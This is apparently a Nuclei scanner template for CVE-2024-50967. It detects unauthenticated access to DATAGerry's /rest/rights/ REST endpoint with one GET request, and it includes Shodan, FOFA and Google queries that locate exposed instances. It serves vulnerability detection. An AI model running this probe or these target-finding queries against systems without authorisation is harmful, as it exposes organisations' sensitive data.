id: CVE-2024-50967

info:
  name: DATAGERRY - Improper Access Control
  author: s4e-io,0xByteHunter
  severity: medium
  description: |
    The /rest/rights/ REST API endpoint in Becon DATAGerry through 2.2.0 contains an Incorrect Access Control vulnerability. An attacker can remotely access this endpoint without authentication, leading to unauthorized disclosure of sensitive information.
  reference:
    - https://medium.com/@0xbytehunter/my-first-cve-discovery-of-broken-access-control-in-the-datagerry-platform-7b0404f88a43
    - https://github.com/0xByteHunter/CVE-2024-50967
    - https://nvd.nist.gov/vuln/detail/CVE-2024-50967
    - https://datagerry.readthedocs.io/en/latest/api/rest/user-management.html#rights
    - https://github.com/cyb3r-w0lf/nuclei-template-collection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2024-50967
    cwe-id: CWE-200
    epss-score: 0.37152
    epss-percentile: 0.96615
  metadata:
    verified: true
    max-request: 1
    vendor: becon
    product: datagerry
    shodan-query: http.title:"datagerry"
    fofa-query: title="datagerry"
    google-query: intitle:"datagerry"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)datagerry"})
  tags: cve,cve2024,datagerry,auth-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/rest/rights/"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"response_type":'
          - '"model":'
          - '"time":'
        condition: and

      - type: word
        part: content_type
        words:
          - "application/json"

      - type: status
        status:
          - 200

